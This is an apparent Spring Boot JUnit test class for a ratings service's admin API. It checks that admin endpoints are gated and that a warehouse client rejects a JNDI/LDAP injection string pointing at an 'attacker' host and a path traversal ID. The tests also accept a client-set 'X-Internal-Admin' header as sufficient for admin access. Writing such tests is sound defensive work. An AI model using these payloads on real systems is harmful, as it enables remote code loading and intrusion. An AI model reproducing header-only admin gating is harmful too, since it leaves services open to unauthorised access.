package com.northgate.ratings;

import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.SocketTimeoutException;

import com.northgate.ratings.integration.WarehouseClient;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.web.servlet.MockMvc;

import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

@SpringBootTest
@AutoConfigureMockMvc
class AdminApiTest {

    @Autowired
    private MockMvc mvc;

    @Test
    void adminEndpointsAreForbiddenWithoutInternalHeader() throws Exception {
        mvc.perform(get("/api/admin/warehouse/NG-1001"))
                .andExpect(status().isForbidden());
        mvc.perform(get("/api/admin/ratings"))
                .andExpect(status().isForbidden());
    }

    @Test
    void adminEndpointsAreReachableWithInternalHeader() throws Exception {
        mvc.perform(get("/api/admin/ratings").header("X-Internal-Admin", "true"))
                .andExpect(status().isOk());
    }

    @Test
    void warehouseLookupRejectsMalformedIssuerIdBeforeAnyCall() throws Exception {
        try (ServerSocket warehouse = new ServerSocket(0, 1, InetAddress.getLoopbackAddress())) {
            warehouse.setSoTimeout(500);
            WarehouseClient client = new WarehouseClient("http://127.0.0.1:" + warehouse.getLocalPort());

            assertNull(client.fetchIssuerDossier("${jndi:ldap://attacker/x}"));
            assertNull(client.fetchIssuerDossier("NG-1001/../../admin"));
            assertThrows(SocketTimeoutException.class, warehouse::accept);
        }
    }
}
